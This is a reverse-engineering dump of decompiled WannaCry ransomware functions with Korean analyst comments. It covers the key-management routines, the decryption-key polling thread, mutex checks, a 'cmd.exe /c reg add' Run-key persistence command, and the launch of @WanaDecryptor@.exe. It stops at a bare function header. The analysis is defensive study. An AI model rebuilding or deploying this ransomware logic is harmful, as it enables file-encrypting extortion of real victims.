// Function Name: WStringAssign_10003810
// Address: 0x10003810
// Signature: unknown_signature
// ---------------
void __cdecl WStringAssign_10003810(int destWstring, char *srcWstring)
{
  char firstChar; // al
  unsigned int srcLength; // edi
  unsigned int newPos; // ebx
  unsigned int remainLength; // eax
  unsigned int grownLength; // edi
  LPCWSTR srcData; // eax
  LPCWSTR srcData_1; // eax
  LPCWSTR srcData_2; // ecx
  _WORD *destBuffer; // eax
  unsigned int copyLength; // edx
  __int16 curChar; // bx
  int destDataAddr; // edx

  if ( destWstring )                            // std::wstring의 복사 또는 초기화 함수 
  {
    firstChar = *srcWstring;
    *(_DWORD *)(destWstring + 4) = 0;
    *(_BYTE *)destWstring = firstChar;
    *(_DWORD *)(destWstring + 8) = 0;
    *(_DWORD *)(destWstring + 12) = 0;
    srcLength = *((_DWORD *)srcWstring + 2);
    if ( std::wstring::npos < srcLength )
      srcLength = std::wstring::npos;
    if ( (char *)destWstring == srcWstring )
    {
      newPos = std::wstring::npos;
      if ( srcLength )
        std::_Xran();
      std::wstring::_Split(destWstring);
      remainLength = *(_DWORD *)(destWstring + 8) - srcLength;
      if ( remainLength < std::wstring::npos )
        newPos = *(_DWORD *)(destWstring + 8) - srcLength;
      if ( newPos )
      {
        wmemmove(
          (wchar_t *)(*(_DWORD *)(destWstring + 4) + 2 * srcLength),
          (const wchar_t *)(*(_DWORD *)(destWstring + 4) + 2 * (newPos + srcLength)),
          remainLength - newPos);
        grownLength = *(_DWORD *)(destWstring + 8) - newPos;
        if ( (unsigned __int8)std::wstring::_Grow(destWstring, grownLength, 0) )
          std::wstring::_Eos(destWstring, grownLength);
      }
      std::wstring::_Split(destWstring);
    }
    else
    {
      if ( !srcLength || srcLength != *((_DWORD *)srcWstring + 2) )
        goto LABEL_30;
      srcData = (LPCWSTR)*((_DWORD *)srcWstring + 1);
      if ( !srcData )
        srcData = `std::wstring::_Nullstr'::`2'::_C;
      if ( *((_BYTE *)srcData - 1) < 0xFEu )
      {
        std::wstring::_Tidy(destWstring, 1);
        srcData_1 = (LPCWSTR)*((_DWORD *)srcWstring + 1);
        if ( !srcData_1 )
          srcData_1 = `std::wstring::_Nullstr'::`2'::_C;
        *(_DWORD *)(destWstring + 4) = srcData_1;
        *(_DWORD *)(destWstring + 8) = *((_DWORD *)srcWstring + 2);
        *(_DWORD *)(destWstring + 12) = *((_DWORD *)srcWstring + 3);
        ++*((_BYTE *)srcData_1 - 1);
      }
      else
      {
LABEL_30:
        if ( (unsigned __int8)std::wstring::_Grow(destWstring, srcLength, 1) )
        {
          srcData_2 = (LPCWSTR)*((_DWORD *)srcWstring + 1);
          if ( !srcData_2 )
            srcData_2 = `std::wstring::_Nullstr'::`2'::_C;
          destBuffer = *(_WORD **)(destWstring + 4);
          if ( srcLength )
          {
            copyLength = srcLength;
            do
            {
              curChar = *srcData_2++;
              *destBuffer++ = curChar;
              --copyLength;
            }
            while ( copyLength );
          }
          destDataAddr = *(_DWORD *)(destWstring + 4);
          *(_DWORD *)(destWstring + 8) = srcLength;
          *(_WORD *)(destDataAddr + 2 * srcLength) = 0;
        }
      }
    }
  }
}


// --- Metadata ---
// Function Name: _wmemmove
// Address: 0x10003990
// Signature: unknown_signature
// ---------------
wchar_t *__cdecl wmemmove(wchar_t *S1, const wchar_t *S2, size_t N)
{
  wchar_t *result; // eax
  const wchar_t *v4; // ecx
  size_t v5; // esi
  wchar_t *v6; // edx
  wchar_t *v7; // edx
  const wchar_t *v8; // ecx
  wchar_t v9; // di
  wchar_t v10; // di

  result = S1;
  v4 = S2;
  v5 = N;
  v6 = S1;
  if ( S2 >= S1 || S1 >= &S2[N] )
  {
    if ( N )
    {
      do
      {
        v10 = *v4++;
        *v6++ = v10;
        --v5;
      }
      while ( v5 );
    }
  }
  else
  {
    v7 = &S1[N];
    v8 = &S2[N];
    if ( N )
    {
      do
      {
        v9 = *--v8;
        --v7;
        --v5;
        *v7 = v9;
      }
      while ( v5 );
    }
  }
  return result;
}


// --- Metadata ---
// Function Name: nullsub_1
// Address: 0x100039E0
// Signature: unknown_signature
// ---------------
void nullsub_1()
{
  ;
}


// --- Metadata ---
// Function Name: _DllMain@12
// Address: 0x100039F0
// Signature: unknown_signature
// ---------------
BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
  if ( fdwReason == 1 )
    dword_1000D938 = (int)hinstDLL;
  return 1;
}


// --- Metadata ---
// Function Name: initObject_10003A10
// Address: 0x10003A10
// Signature: unknown_signature
// ---------------
char *__thiscall initObject_10003A10(char *this)
{
  *((_DWORD *)this + 1) = 0;
  *((_DWORD *)this + 2) = 0;
  *((_DWORD *)this + 3) = 0;
  *(_DWORD *)this = &off_1000720C;
  InitializeCriticalSection((LPCRITICAL_SECTION)(this + 16));
  return this;
}


// --- Metadata ---
// Function Name: sub_10003A40
// Address: 0x10003A40
// Signature: unknown_signature
// ---------------
void *__thiscall sub_10003A40(void *this, char a2)
{
  DeleteCriticalSection_10003A60((char *)this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}


// --- Metadata ---
// Function Name: DeleteCriticalSection_10003A60
// Address: 0x10003A60
// Signature: unknown_signature
// ---------------
void __thiscall DeleteCriticalSection_10003A60(char *this)
{
  *(_DWORD *)this = &off_1000720C;
  DeleteCriticalSection((LPCRITICAL_SECTION)(this + 16));
}


// --- Metadata ---
// Function Name: InitCryptoProvider_10003A80
// Address: 0x10003A80
// Signature: unknown_signature
// ---------------
BOOL __thiscall InitCryptoProvider_10003A80(char *this)
{
  int v1; // esi
  HCRYPTPROV *v2; // edi
  BOOL result; // eax

  v1 = 0;
  v2 = (HCRYPTPROV *)(this + 4);
  while ( 1 )                                   // 암호화 서비스 공급자(CSP)를 확보 
  {
    result = CryptAcquireContextA(
               v2,
               0,
               (LPCSTR)(v1 != 0 ? (unsigned int)"Microsoft Enhanced RSA and AES Cryptographic Provider" : 0),
               0x18u,
               0xF0000000);
    if ( result )
      break;
    if ( ++v1 >= 2 )
      return result;
  }
  return 1;
}


// --- Metadata ---
// Function Name: SetupCryptoSessionKey_10003AC0
// Address: 0x10003AC0
// Signature: unknown_signature
// ---------------
int __thiscall SetupCryptoSessionKey_10003AC0(_DWORD *this, LPCSTR keyFilePath, LPCSTR backupBlobPath)
{
  HCRYPTKEY v5; // esi

  if ( !InitCryptoProvider_10003A80((char *)this) )
    goto LABEL_2;
  if ( keyFilePath )                            // 암호화 컨텍스트(CSP, 세션키, 공개키)를 초기화하고, 세션키를 파일에서 불러오거나(복원), 없으면 새로 생성해서 파일에 저장한 뒤(내보내기), 필요시 추가 백업(a3)도 처리
  {
    if ( !SetKey_10003C00(this, keyFilePath) )
    {
      if ( !CryptImportKey(this[1], defaultPubKeyBlob_1000CF40, 0x114u, 0, 0, this + 3)
        || !CallLoadCryptographicAPI_10004350(this[1], (int)(this + 2))
        || !ExportKeyToFile_10004040(this[1], this[2], 6u, keyFilePath) )
      {
        goto LABEL_2;
      }
      if ( backupBlobPath )
        SaveEncryptedKeyBlobToFile_10003C40((int)this, backupBlobPath);
      if ( !SetKey_10003C00(this, keyFilePath) )
        goto LABEL_2;
    }
    v5 = this[3];
    if ( v5 )
      CryptDestroyKey(v5);
  }
  else if ( !CryptImportKey(this[1], builtinPubKeyBlob_1000D054, 0x114u, 0, 0, this + 2) )
  {
LABEL_2:
    ReleaseCryptoResources_10003BB0(this);
    return 0;
  }
  return 1;
}


// --- Metadata ---
// Function Name: ReleaseCryptoResources_10003BB0
// Address: 0x10003BB0
// Signature: unknown_signature
// ---------------
int __thiscall ReleaseCryptoResources_10003BB0(_DWORD *this)
{
  HCRYPTPROV v2; // eax

  if ( this[2] )
  {
    CryptDestroyKey(this[2]);
    this[2] = 0;
  }
  if ( this[3] )
  {
    CryptDestroyKey(this[3]);
    this[3] = 0;
  }
  v2 = this[1];
  if ( v2 )
  {
    CryptReleaseContext(v2, 0);
    this[1] = 0;
  }
  return 1;
}


// --- Metadata ---
// Function Name: SetKey_10003C00
// Address: 0x10003C00
// Signature: unknown_signature
// ---------------
int __thiscall SetKey_10003C00(int *this, LPCSTR lpFileName)
{
  int *v3; // esi

  v3 = this + 2;
  if ( this[2] )
  {
    CryptDestroyKey(this[2]);
    *v3 = 0;
  }
  return ImportKeyFromFile_10003F00(this[1], (int)v3, lpFileName);
}


// --- Metadata ---
// Function Name: SaveEncryptedKeyBlobToFile_10003C40
// Address: 0x10003C40
// Signature: unknown_signature
// ---------------
BYTE *__thiscall SaveEncryptedKeyBlobToFile_10003C40(int this, LPCSTR lpFileName)
{
  BYTE *result; // eax
  BYTE *v3; // ebx
  HANDLE v4; // eax
  void *v5; // esi
  DWORD Buffer; // [esp+8h] [ebp-8h] BYREF
  DWORD NumberOfBytesWritten; // [esp+Ch] [ebp-4h] BYREF

  Buffer = 0;
  NumberOfBytesWritten = 0;
  if ( !lpFileName )                            // 특정 데이터 조합으로 블롭 생성 
    return 0;
  result = EncryptKeyBlob_10004170(*(_DWORD *)(this + 4), *(_DWORD *)(this + 8), *(_DWORD *)(this + 12), 7u, &Buffer);
  v3 = result;
  if ( result )
  {
    v4 = CreateFileA(lpFileName, 0x40000000u, 1u, 0, 4u, 0x80u, 0);
    v5 = v4;
    if ( v4 != (HANDLE)-1 )
    {
      SetFilePointer(v4, 0, 0, 2u);
      WriteFile(v5, &Buffer, 4u, &NumberOfBytesWritten, 0);// 파일에 저장 
      WriteFile(v5, v3, Buffer, &NumberOfBytesWritten, 0);
    }
    GlobalFree(v3);                             // 리소스 정리 
    result = (BYTE *)(NumberOfBytesWritten == Buffer);
  }
  return result;
}


// --- Metadata ---
// Function Name: VerifyKeyPair_10003D10
// Address: 0x10003D10
// Signature: unknown_signature
// ---------------
int __thiscall VerifyKeyPair_10003D10(int this, LPCSTR lpFileName, LPCSTR a3)
{
  DWORD pdwDataLen; // [esp+10h] [ebp-228h] BYREF
  char Str2[12]; // [esp+14h] [ebp-224h] BYREF
  char Str1; // [esp+20h] [ebp-218h] BYREF
  char v8[508]; // [esp+21h] [ebp-217h] BYREF
  __int16 v9; // [esp+21Dh] [ebp-1Bh]
  char v10; // [esp+21Fh] [ebp-19h]
  CPPEH_RECORD ms_exc; // [esp+220h] [ebp-18h] BYREF

  strcpy(Str2, "TESTDATA");                     // 테스트 문자열에 대해 암/복호화를 통해 키 쌍의 유효성 검증 
  Str2[9] = 0;
  Str1 = 0;
  memset(v8, 0, sizeof(v8));
  v9 = 0;
  v10 = 0;
  pdwDataLen = strlen(Str2);
  if ( !InitCryptoProvider_10003A80((char *)this) )
    return 0;
  ms_exc.registration.TryLevel = 0;
  if ( !ImportKeyFromFile_10003F00(*(_DWORD *)(this + 4), this + 8, lpFileName)
    || !ImportKeyFromFile_10003F00(*(_DWORD *)(this + 4), this + 12, a3) )
  {
    local_unwind2(&ms_exc.registration, -1);
    return 0;
  }
  strcpy(&Str1, Str2);
  if ( !CryptEncrypt(*(_DWORD *)(this + 8), 0, 1, 0, (BYTE *)&Str1, &pdwDataLen, 0x200u)
    || !CryptDecrypt(*(_DWORD *)(this + 12), 0, 1, 0, (BYTE *)&Str1, &pdwDataLen) )
  {
    local_unwind2(&ms_exc.registration, -1);
    return 0;
  }
  if ( strncmp(&Str1, Str2, strlen(Str2)) )
  {
    ms_exc.registration.TryLevel = -1;
    ReleaseCryptoResources_10003BB0((_DWORD *)this);
    return 0;
  }
  local_unwind2(&ms_exc.registration, -1);
  return 1;
}


// --- Metadata ---
// Function Name: ImportKeyFromFile_10003F00
// Address: 0x10003F00
// Signature: unknown_signature
// ---------------
int __cdecl ImportKeyFromFile_10003F00(int a1, int a2, LPCSTR lpFileName)
{
  HANDLE v3; // eax
  void *v4; // edi
  DWORD v5; // eax
  DWORD v6; // esi
  BYTE *v7; // eax
  const BYTE *v8; // ebx
  DWORD NumberOfBytesRead; // [esp+18h] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+1Ch] [ebp-18h] BYREF

  NumberOfBytesRead = 0;
  ms_exc.registration.TryLevel = 0;
  v3 = CreateFileA(lpFileName, 0x80000000, 1u, 0, 3u, 0, 0);
  v4 = v3;
  if ( v3 == (HANDLE)-1 )
  {
LABEL_9:                                        // 외부 파일에 저장된 암호화 키를 불러오는 동작 
    local_unwind2(&ms_exc.registration, -1);
    return 0;
  }
  v5 = GetFileSize(v3, 0);
  v6 = v5;
  if ( v5 != -1 && v5 <= 0x19000 )
  {
    v7 = (BYTE *)GlobalAlloc(0, v5);
    v8 = v7;
    if ( v7
      && ReadFile(v4, v7, v6, &NumberOfBytesRead, 0)
      && CryptImportKey(a1, v8, NumberOfBytesRead, 0, 0, (HCRYPTKEY *)a2) )
    {
      local_unwind2(&ms_exc.registration, -1);
      return 1;
    }
    goto LABEL_9;
  }
  local_unwind2(&ms_exc.registration, -1);
  return 0;
}


// --- Metadata ---
// Function Name: ExportKeyToFile_10004040
// Address: 0x10004040
// Signature: unknown_signature
// ---------------
int __cdecl ExportKeyToFile_10004040(int a1, HCRYPTKEY hKey, DWORD dwBlobType, LPCSTR lpFileName)
{
  HGLOBAL v4; // eax
  const void *v5; // esi
  int result; // eax
  HANDLE v7; // eax
  DWORD pdwDataLen; // [esp+10h] [ebp-24h] BYREF
  HGLOBAL hMem; // [esp+14h] [ebp-20h]
  DWORD NumberOfBytesWritten; // [esp+18h] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+1Ch] [ebp-18h] BYREF

  pdwDataLen = 0;
  NumberOfBytesWritten = 0;
  hMem = 0;
  ms_exc.registration.TryLevel = 0;
  if ( CryptExportKey(hKey, 0, dwBlobType, 0, 0, &pdwDataLen)// 암호화 키를 파일로 내보내기 
    && (v4 = GlobalAlloc(0, pdwDataLen), v5 = v4, (hMem = v4) != 0)
    && CryptExportKey(hKey, 0, dwBlobType, 0, (BYTE *)v4, &pdwDataLen)
    && (v7 = CreateFileA(lpFileName, 0x40000000u, 0, 0, 2u, 0x80u, 0), v7 != (HANDLE)-1)
    && WriteFile(v7, v5, pdwDataLen, &NumberOfBytesWritten, 0) )
  {
    local_unwind2(&ms_exc.registration, -1);
    result = 1;
  }
  else
  {
    local_unwind2(&ms_exc.registration, -1);
    result = 0;
  }
  return result;
}


// --- Metadata ---
// Function Name: EncryptKeyBlob_10004170
// Address: 0x10004170
// Signature: unknown_signature
// ---------------
BYTE *__cdecl EncryptKeyBlob_10004170(int a1, HCRYPTKEY hKey, HCRYPTKEY a3, DWORD dwBlobType, DWORD *pdwDataLen)
{
  BYTE *result; // eax
  BYTE *v6; // eax
  int v7; // ecx
  DWORD v8; // ebp
  DWORD v9; // eax
  DWORD v10; // ebx
  BYTE *v11; // eax
  int v12; // ecx
  BYTE *v13; // eax
  int v14; // edx
  BYTE *v15; // eax
  BYTE *v16; // ecx
  int v17; // edx
  BYTE *v18; // eax
  int v19; // ecx
  DWORD v20; // [esp+8h] [ebp-2028h]
  DWORD v21; // [esp+1Ch] [ebp-2014h] BYREF
  int v22; // [esp+20h] [ebp-2010h]
  BYTE *v23; // [esp+24h] [ebp-200Ch]
  HGLOBAL hMem; // [esp+28h] [ebp-2008h]
  BYTE v25[4]; // [esp+2Ch] [ebp-2004h] BYREF
  BYTE pbData[4096]; // [esp+30h] [ebp-2000h] BYREF 성공 여부와 상관없이 pbData 버퍼는 항상 0으로 초기화됨(보안)
  BYTE v27[4096]; // [esp+1030h] [ebp-1000h] BYREF

  *(_DWORD *)v25 = 0;                           // 대칭키(hKey)를 다른 키(a3)로 RSA 암호화해서 안전하게 저장할 수 있도록 블롭(blob)을 생성 
  v21 = 0;
  *pdwDataLen = 4096;
  result = (BYTE *)CryptExportKey(hKey, 0, dwBlobType, 0, pbData, pdwDataLen);// 암호화된 blob 포인터 출력 
  if ( result )
  {
    v21 = 4;
    if ( CryptGetKeyParam(a3, 8u, v25, &v21, 0) )
    {
      v8 = *(_DWORD *)v25 >> 3;
      v9 = *pdwDataLen - 1;
      v21 = (*(_DWORD *)v25 >> 3) - 11;
      v10 = v9 / v21 + 1;
      v20 = (*(_DWORD *)v25 >> 3) * v10;
      *pdwDataLen = v20;
      result = (BYTE *)GlobalAlloc(0, v20);
      hMem = result;
      if ( result )
      {
        v23 = result;
        v22 = 0;
        if ( v10 )
        {
          while ( 1 )
          {
            v13 = v27;
            v21 = v8 - 11;
            v14 = 4096;
            do
            {
              *v13++ = 0;
              --v14;
            }
            while ( v14 );
            qmemcpy(v27, &pbData[(v8 - 11) * v22], v8 - 11);
            if ( !CryptEncrypt(a3, 0, 1, 0, v27, &v21, v8) )
              break;
            v15 = v23;
            qmemcpy(v23, v27, v21);
            v23 = &v15[v21];
            if ( ++v22 >= v10 )
            {
              result = (BYTE *)hMem;
              goto LABEL_16;
            }
          }
          GlobalFree(hMem);
          v18 = pbData;
          v19 = 4096;
          do
          {
            *v18++ = 0;
            --v19;
          }
          while ( v19 );
          result = 0;
        }
        else
        {
LABEL_16:
          v16 = pbData;
          v17 = 4096;
          do
          {
            *v16++ = 0;
            --v17;
          }
          while ( v17 );
        }
      }
      else
      {
        v11 = pbData;
        v12 = 4096;
        do
        {
          *v11++ = 0;
          --v12;
        }
        while ( v12 );
        result = 0;
      }
    }
    else
    {
      v6 = pbData;
      v7 = 4096;
      do
      {
        *v6++ = 0;
        --v7;
      }
      while ( v7 );
      result = 0;
    }
  }
  return result;
}


// --- Metadata ---
// Function Name: CallLoadCryptographicAPI_10004350
// Address: 0x10004350
// Signature: unknown_signature
// ---------------
BOOL __cdecl CallLoadCryptographicAPI_10004350(int a1, int a2)
{
  return dword_1000D950(a1, 1, 134217729, a2) != 0;// 함수 포인터 래퍼 
}


// --- Metadata ---
// Function Name: GenerateAndEncryptRandomData_10004370
// Address: 0x10004370
// Signature: unknown_signature
// ---------------
BOOL __thiscall GenerateAndEncryptRandomData_10004370(int this, BYTE *pbBuffer, DWORD dwLen, int pbData, int encryptedBufferInfo)
{
  BOOL result; // eax
  BYTE *dstDataPtr; // ebp
  DWORD *encryptedSizePtr; // edi
  BOOL v9; // eax
  struct _RTL_CRITICAL_SECTION *v10; // [esp+0h] [ebp-14h]

  if ( !*(_DWORD *)(this + 8) )
    return 0;
  result = CryptGenRandomWrapper_10004420((HCRYPTPROV *)this, pbBuffer, dwLen);// 랜덤 데이터를 생성하고, 이를 암호화하여 출력 버퍼에 저장
  if ( result )
  {
    dstDataPtr = (BYTE *)pbData;
    if ( pbData && encryptedBufferInfo )
    {
      qmemcpy((void *)pbData, pbBuffer, dwLen);
      EnterCriticalSection((LPCRITICAL_SECTION)(this + 16));
      encryptedSizePtr = (DWORD *)encryptedBufferInfo;
      v9 = CryptEncrypt(*(_DWORD *)(this + 8), 0, 1, 0, dstDataPtr, &dwLen, *(_DWORD *)encryptedBufferInfo);
      v10 = (struct _RTL_CRITICAL_SECTION *)(this + 16);
      if ( !v9 )
      {
        LeaveCriticalSection(v10);
        return 0;
      }
      LeaveCriticalSection(v10);
      *encryptedSizePtr = dwLen;
    }
    result = 1;
  }
  return result;
}


// --- Metadata ---
// Function Name: CryptGenRandomWrapper_10004420
// Address: 0x10004420
// Signature: unknown_signature
// ---------------
BOOL __thiscall CryptGenRandomWrapper_10004420(HCRYPTPROV *this, BYTE *pbBuffer, DWORD dwLen)
{
  return CryptGenRandom(this[1], dwLen, pbBuffer);
}


// --- Metadata ---
// Function Name: LoadCryptographicAPI_10004440
// Address: 0x10004440
// Signature: unknown_signature
// ---------------
int LoadCryptographicAPI_10004440()
{
  int result; // eax
  HMODULE v1; // eax
  HMODULE v2; // esi
  BOOL (__stdcall *CryptGenKey)(HCRYPTPROV, ALG_ID, DWORD, HCRYPTKEY *); // eax

  if ( CryptAcquireContextA )                   // Cryptography 관련 API를 동적으로 로드
    return 1;
  v1 = LoadLibraryA("advapi32.dll");
  v2 = v1;
  result = 0;
  if ( v1 )
  {
    CryptAcquireContextA = (BOOL (__stdcall *)(HCRYPTPROV *, LPCSTR, LPCSTR, DWORD, DWORD))GetProcAddress(
                                                                                             v1,
                                                                                             "CryptAcquireContextA");
    CryptImportKey = (BOOL (__stdcall *)(HCRYPTPROV, const BYTE *, DWORD, HCRYPTKEY, DWORD, HCRYPTKEY *))GetProcAddress(v2, "CryptImportKey");
    CryptDestroyKey = (BOOL (__stdcall *)(HCRYPTKEY))GetProcAddress(v2, "CryptDestroyKey");
    *(_DWORD *)CryptEncrypt = GetProcAddress(v2, "CryptEncrypt");
    *(_DWORD *)CryptDecrypt = GetProcAddress(v2, "CryptDecrypt");
    CryptGenKey = (BOOL (__stdcall *)(HCRYPTPROV, ALG_ID, DWORD, HCRYPTKEY *))GetProcAddress(v2, "CryptGenKey");
    dword_1000D950 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))CryptGenKey;
    if ( CryptAcquireContextA )
    {
      if ( CryptImportKey && CryptDestroyKey && *(_DWORD *)CryptEncrypt && *(_DWORD *)CryptDecrypt && CryptGenKey )
        result = 1;
    }
  }
  return result;
}


// --- Metadata ---
// Function Name: importKeyAndVerify_10004500
// Address: 0x10004500
// Signature: unknown_signature
// ---------------
int __cdecl importKeyAndVerify_10004500(int a1)
{
  int v1; // eax
  char v3[40]; // [esp+4h] [ebp-68h] BYREF
  char Buffer[52]; // [esp+2Ch] [ebp-40h] BYREF
  int v5; // [esp+68h] [ebp-4h]

  sprintf(Buffer, "%08X.dky", a1);
  if ( GetFileAttributesA(Buffer) != -1 && GetFileAttributesA(pky_1000DD24) != -1 )
  {
    initObject_10003A10(v3);
    v5 = 0;
    v1 = VerifyKeyPair_10003D10((int)v3, pky_1000DD24, Buffer);// 키 쌍을 가져온 후 검증 
    v5 = -1;
    if ( v1 )
    {
      DeleteCriticalSection_10003A60(v3);
      return 1;
    }
    DeleteCriticalSection_10003A60(v3);
  }
  return 0;
}


// --- Metadata ---
// Function Name: WaitForKeyImportAndVerify_100045C0
// Address: 0x100045C0
// Signature: unknown_signature
// ---------------
void __stdcall __noreturn WaitForKeyImportAndVerify_100045C0(LPVOID lpThreadParameter)
{
  while ( 1 )
  {
    isImportKeySuccess_1000DD8C = importKeyAndVerify_10004500((int)lpThreadParameter);
    if ( isImportKeySuccess_1000DD8C )          // 네트워크나 외부 저장소 등에서 키가 도착할 때까지 기다리며, 주기적으로 키를 불러오고 검증하는 작업 
      break;
    Sleep(5000u);
  }
  ExitThread(0);
}


// --- Metadata ---
// Function Name: createMutexAndGrantToEveryone_10004600
// Address: 0x10004600
// Signature: unknown_signature
// ---------------
int __cdecl createMutexAndGrantToEveryone_10004600(int a1)
{
  HANDLE v1; // eax
  int result; // eax
  HANDLE v3; // esi
  char Buffer[100]; // [esp+4h] [ebp-64h] BYREF

  v1 = OpenMutexA(0x100000u, 1, "Global\\MsWinZonesCacheCounterMutexW");
  if ( v1 )
  {
    CloseHandle(v1);
    result = 1;
  }
  else                                          // 기존 뮤텍스가 없는 경우 
  {
    sprintf(Buffer, "%s%d", "Global\\MsWinZonesCacheCounterMutexA", a1);
    v3 = CreateMutexA(0, 1, Buffer);
    if ( v3 && GetLastError() == 183 )
    {
      CloseHandle(v3);
      result = 1;
    }
    else                                        // 뮤텍스 생성이 성공하면 모든 권한 부여 
    {
      GrantAccessToEveryone_100013E0(v3);
      result = 0;
    }
  }
  return result;
}


// --- Metadata ---
// Function Name: createMutex_10004690
// Address: 0x10004690
// Signature: unknown_signature
// ---------------
int createMutex_10004690()
{
  HANDLE v0; // esi

  v0 = CreateMutexA(0, 1, "MsWinZonesCacheCounterMutexA");
  if ( !v0 || GetLastError() != 183 )
    return 0;
  CloseHandle(v0);
  return 1;
}


// --- Metadata ---
// Function Name: Read136bytes_100046D0
// Address: 0x100046D0
// Signature: unknown_signature
// ---------------
int Read136bytes_100046D0()
{
  HANDLE v0; // esi
  DWORD NumberOfBytesRead; // [esp+4h] [ebp-4h] BYREF

  v0 = CreateFileA(resFile, 0x80000000, 1u, 0, 3u, 0, 0);// 버퍼는 파일 경로 
  if ( v0 == (HANDLE)-1 )
    return 0;
  NumberOfBytesRead = 0;
  ReadFile(v0, &cryptRandom, 136u, &NumberOfBytesRead, 0);// 어떤 파일에서 136바이트를 읽음 
  CloseHandle(v0);
  return 136;
}


// --- Metadata ---
// Function Name: writeCryptrandomToRes_10004730
// Address: 0x10004730
// Signature: unknown_signature
// ---------------
int writeCryptrandomToRes_10004730()
{
  HANDLE v0; // esi
  DWORD NumberOfBytesWritten; // [esp+4h] [ebp-4h] BYREF

  v0 = CreateFileA(resFile, 0x40000000u, 1u, 0, 4u, 0x80u, 0);// res 파일에 랜덤으로 cryptRandomGen으로 생성된 136바이트를 씀 
  if ( v0 == (HANDLE)-1 )
    return 0;
  NumberOfBytesWritten = 0;
  WriteFile(v0, &cryptRandom, 0x88u, &NumberOfBytesWritten, 0);
  CloseHandle(v0);
  return 136;
}


// --- Metadata ---
// Function Name: writeCryptToResPeriodically_10004790
// Address: 0x10004790
// Signature: unknown_signature
// ---------------
void __stdcall __noreturn writeCryptToResPeriodically_10004790(LPVOID lpThreadParameter)
{
  int i; // esi

  while ( !dword_1000DD90 )                     // 종료 플래그 
  {
    dword_1000DCDC = time(0);
    writeCryptrandomToRes_10004730();           // 25초를 주기로 실행 
    for ( i = 0; i < 25; ++i )
    {
      if ( dword_1000DD90 )
        goto LABEL_6;
      Sleep(1000u);                             // 1초 대기 
    }
  }
LABEL_6:
  ExitThread(0);
}


// --- Metadata ---
// Function Name: autostartViaRegedit_100047F0
// Address: 0x100047F0
// Signature: unknown_signature
// ---------------
int __cdecl autostartViaRegedit_100047F0(const char *a1)
{
  char v2[149]; // [esp+8h] [ebp-498h] BYREF 윈도우 부팅 시 자동 실행되도록 레지스트리에 등록 
  __int16 v3; // [esp+9Dh] [ebp-403h]
  char v4; // [esp+9Fh] [ebp-401h]
  char Buffer[1024]; // [esp+A0h] [ebp-400h] BYREF

  strcpy(v2, "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");// 레지스트리 경로 
  if ( IsCurrentProcessAdmin_10001360() )       // 관리자 권한이면 Run 키를 HKLM으로 변경 
  {
    v2[2] = 76;
    v2[3] = 77;
  }
  v2[52] = byte_1000DD98;
  memset(&v2[53], 0, 0x60u);
  v3 = 0;
  v4 = 0;
  GenerateRandomString_100014A0((int)&v2[52]);  // 레지스트리 값 이름 및 실행 파일 경로 지정 
  sprintf(Buffer, "cmd.exe /c reg add %s /v \"%s\" /t REG_SZ /d \"\\\"%s\\\"\" /f", v2, &v2[52], a1);
  return RunProcessWithTimeout_10001080(Buffer, 0x2710u, 0);
}


// --- Metadata ---
// Function Name: LaunchWanaDecryptor_10004890
// Address: 0x10004890
// Signature: unknown_signature
// ---------------
int LaunchWanaDecryptor_10004890()
{
  int result; // eax
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+4h] [ebp-65Ch] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+14h] [ebp-64Ch] BYREF
  CHAR Buffer; // [esp+58h] [ebp-608h] BYREF
  char v4[516]; // [esp+59h] [ebp-607h] BYREF
  __int16 v5; // [esp+25Dh] [ebp-403h]
  char v6; // [esp+25Fh] [ebp-401h]
  CHAR CommandLine[1024]; // [esp+260h] [ebp-400h] BYREF

  if ( !IsCurrentProcessAdmin_10001360() && !dword_1000DD94 )
    goto LABEL_4;
  Buffer = byte_1000DD98;
  memset(v4, 0, sizeof(v4));
  v5 = 0;
  v6 = 0;
  GetFullPathNameA("@WanaDecryptor@.exe", 0x208u, &Buffer, 0);
  sprintf(CommandLine, "%s %s", "taskse.exe", &Buffer);
  RunProcessWithTimeout_10001080(CommandLine, 0, 0);// taskse 실행 
  result = dword_1000DD94;
  if ( !dword_1000DD94 )
  {
LABEL_4:
    StartupInfo.cb = 68;
    ProcessInformation.hProcess = 0;
    memset(&StartupInfo.lpReserved, 0, 0x40u);
    ProcessInformation.hThread = 0;
    ProcessInformation.dwProcessId = 0;
    ProcessInformation.dwThreadId = 0;
    StartupInfo.dwFlags = 1;
    StartupInfo.wShowWindow = 5;
    result = CreateProcessA(0, "@WanaDecryptor@.exe", 0, 0, 0, 0, 0, 0, &StartupInfo, &ProcessInformation);
    if ( result )
    {
      CloseHandle(ProcessInformation.hProcess);
      result = CloseHandle(ProcessInformation.hThread);
    }
  }
  return result;
}


// --- Metadata ---
// Function Name: autostartWanaDecryptor_10004990
// Address: 0x10004990
// Signature: unknown_signature
// ---------------
void __stdcall __noreturn autostartWanaDecryptor_10004990(LPVOID lpThreadParameter)
{
  int v1; // esi
  CHAR Buffer; // [esp+10h] [ebp-208h] BYREF
  char v3[516]; // [esp+11h] [ebp-207h] BYREF
  __int16 v4; // [esp+215h] [ebp-3h]
  char v5; // [esp+217h] [ebp-1h]

  while ( 1 )                                   // WanaDecryptor를 실행하고, 부팅 시 자동 실행되도록 레지스트리에 등록 
  {
    if ( time(0) >= (int)Time && dword_1000DCE0 > 0 )
    {
      v1 = 0;
      if ( !Time )
      {
        v1 = 1;
        Time = (__time32_t *)time(0);
        CwnryIO_10001000(&unk_1000D958, 0);
      }
      LaunchWanaDecryptor_10004890();
      if ( v1 )
      {
        Buffer = byte_1000DD98;
        memset(v3, 0, sizeof(v3));
        v4 = 0;
        v5 = 0;
        GetFullPathNameA("tasksche.exe", 0x208u, &Buffer, 0);
        autostartViaRegedit_100047F0(&Buffer);  // 윈도우 레지스트리 기반 영속성(persistence) 확보 
      }                                         // 무작위 키 이름 생성과 관리자 권한 분기 사용은 분석을 어렵게 하기 위한 조치 
    }
    Sleep(0x7530u);
  }
}


// --- Metadata ---
// Function Name: ScanUserDirs_10004A40
// Address: 0x10004A40
// Signature: unknown_signature
// ---------------
